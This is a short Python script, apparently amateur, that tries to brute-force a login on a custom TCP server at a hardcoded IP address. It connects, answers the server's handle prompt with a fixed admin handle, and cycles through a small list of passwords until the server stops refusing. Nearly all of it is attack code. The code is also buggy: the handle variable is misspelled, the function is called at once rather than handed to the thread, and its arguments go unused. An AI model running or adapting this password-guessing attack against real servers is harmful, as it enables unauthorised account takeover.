import socket, threading

# setting static handle since we know "Max" is admin on the server.


hanlde = 'hello'
global handle

format = 'utf8'

passwords = ('hello', 'test','pass','password', 'ljadsklf','123k12kl','123jl12k;j3','kdsjfl;ksdf','123123','adsfasdf', 'adsfa','asdfasdf')


def connection(username, password):

    for x in passwords:

        client = socket.socket()
        client.connect(("142.47.221.217", 443))
        print("Connection Sucesfull")


        # Looking at the code we see that a 'SYN' is sent first.. maybe some validation
        client.send('SYN'.encode(format))

        # receiving message from server
        message = client.recv(1024).decode(format)
        print(message)
        # Chekcing if server sent special instructions.
        if "HANDLE" in message:
            # print("Handle in Message")
            client.send(handle.encode(format))

            # If server asks for a keyword do this
            nextMessage = client.recv(1024).decode(format)
            print(nextMessage)
            if 'PASS' in nextMessage:
               #password = input("Enter Password (Input will be blank):")
                client.send(x.encode(format))
                msg = client.recv(1024).decode(format)
                print(msg)
                if msg != "REFUSE":
                    print("Success maybe??")
                    print(x)
                    break
                else:
                    print("refused??")
                    client.close()





threadTake = threading.Thread(target=connection('Max', 'testpass'))
threadTake.start()
